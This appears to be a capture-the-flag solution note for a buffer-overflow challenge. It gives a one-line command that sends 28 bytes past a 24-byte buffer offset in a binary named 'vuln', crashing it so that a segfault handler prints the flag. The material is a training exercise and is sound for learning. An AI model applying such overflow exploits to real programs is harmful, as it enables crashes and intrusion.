# This is manual solution
# Run:
	../vuln $(python -c "print('a'*28)")
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../vuln"

# Explanation:
#	The buffer in at offset 24
#	Then the previous stack pointer and the return address

# If we will send 28 bytes the "previous stack pointer" will point to invalid memory
# causing Segmentation fault (SIGSEGV) which will trigger the sigsegv_handler
# that prints out the flag
